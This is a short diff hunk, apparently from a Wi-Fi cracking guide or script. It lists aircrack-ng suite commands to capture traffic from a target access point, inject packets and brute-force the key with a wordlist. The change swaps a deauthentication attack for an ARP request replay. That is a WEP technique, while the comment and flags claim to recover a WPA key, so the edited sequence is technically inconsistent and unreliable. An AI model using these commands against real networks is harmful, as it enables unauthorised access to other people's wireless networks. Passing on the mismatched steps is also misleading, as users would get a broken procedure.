@@ -201,7 +201,7 @@ airodump-ng mon0
 airodump-ng -c 10 --bssid 08:00:BF:E6:31:2E -w output-file mon0
 
 # start the ARP request replay attack
-aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+aireplay-ng --arpreplay -b 08:00:BF:E6:31:2E -h 00:0F:35:51:AC:22 mon0
 
 # run aircrack-ng to obtain the WPA key
 aircrack-ng -a2 -b 08:00:BF:E6:31:2E -w wordlist.txt output*.cap
